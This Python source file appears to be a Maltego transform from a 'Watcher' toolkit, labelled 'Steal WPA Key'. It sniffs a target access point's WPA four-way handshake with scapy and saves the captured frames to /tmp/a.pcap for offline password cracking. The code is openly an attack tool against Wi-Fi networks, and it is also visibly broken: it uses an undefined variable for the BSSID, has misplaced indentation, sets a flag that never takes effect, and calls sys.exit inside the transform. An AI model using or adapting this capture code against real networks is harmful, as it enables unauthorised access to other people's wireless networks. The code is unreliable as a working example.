#!/usr/bin/env python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from canari.maltego.message import UIMessage, Field
from common.entities import AccessPoint, WPAKey
from canari.framework import configure, superuser

__author__ = 'catalyst256'
__copyright__ = 'Copyright 2013, Watcher Project'
__credits__ = []

__license__ = 'GPL'
__version__ = '0.1'
__maintainer__ = 'catalyst256'
__email__ = 'catalyst256@gmail.com'
__status__ = 'Development'

__all__ = [
    'dotransform'
]

@superuser
@configure(
    label='Watcher - Steal WPA Key',
    description='Looks to steal WPA key for cracking later',
    uuids=[ 'Watcher.v2.steal_wpa_key' ],
    inputs=[ ( 'Watcher', AccessPoint ) ],
    debug=True
)
def dotransform(request, response):
    
    eapol_key = []
    handshake_found = 0

    try:
        bssid = request.fields['Watcher.bssid']
        channel = request.fields['Watcher.channel']
        iface = request.fields['Watcher.apmoninterface']
    except:
        return response + UIMessage('Sorry this is missing something..!!')

    def sniff_wpa(p):

        if p.haslayer(WPA_key):
            layer = p.getlayer (WPA_key)

            AP = p.addr3
            if (not AP == bss_id_addr):
                print AP
                print "not ours\n"
                return

            if (p.FCfield & 1): 
                STA = p.addr2
            elif (p.FCfield & 2): 
                STA = p.addr1
            else:
                return
                
        if (not tracking.has_key (STA)):
            fields = {
                        'frame2': None,
                        'frame3': None,
                        'frame4': None,
                        'replay_counter': None,
                        'packets': []
                    }
            tracking[STA] = fields

        key_info = layer.key_info
        wpa_key_length = layer.wpa_key_length
        replay_counter = layer.replay_counter

        WPA_KEY_INFO_INSTALL = 64
        WPA_KEY_INFO_ACK = 128
        WPA_KEY_INFO_MIC = 256

        # check for frame 2
        if ((key_info & WPA_KEY_INFO_MIC) and 
            (key_info & WPA_KEY_INFO_ACK == 0) and 
            (key_info & WPA_KEY_INFO_INSTALL == 0) and 
            (wpa_key_length > 0)) :
            print "Found packet 2 for ", STA
            tracking[STA]['frame2'] = 1
            tracking[STA]['packets'].append (p)

        # check for frame 3
        elif ((key_info & WPA_KEY_INFO_MIC) and 
            (key_info & WPA_KEY_INFO_ACK) and 
            (key_info & WPA_KEY_INFO_INSTALL)):
            print "Found packet 3 for ", STA
            tracking[STA]['frame3'] = 1
            # store the replay counter for this STA
            tracking[STA]['replay_counter'] = replay_counter
            tracking[STA]['packets'].append (p)

        # check for frame 4
        elif ((key_info & WPA_KEY_INFO_MIC) and 
            (key_info & WPA_KEY_INFO_ACK == 0) and 
            (key_info & WPA_KEY_INFO_INSTALL == 0) and
            tracking[STA]['replay_counter'] == replay_counter):
            print "Found packet 4 for ", STA
            tracking[STA]['frame4'] = 1
            tracking[STA]['packets'].append (p)

        
        if (tracking[STA]['frame2'] and tracking[STA]['frame3'] and tracking[STA]['frame4']):
            print "Handshake Found\n\n"
            wrpcap ("/tmp/a.pcap", tracking[STA]['packets'])
            handshake_found = 1
            sys.exit(0)

    tracking = {}

    sniff(iface=iface,prn=sniff_wpa, count=1000, timeout=30)

    return response
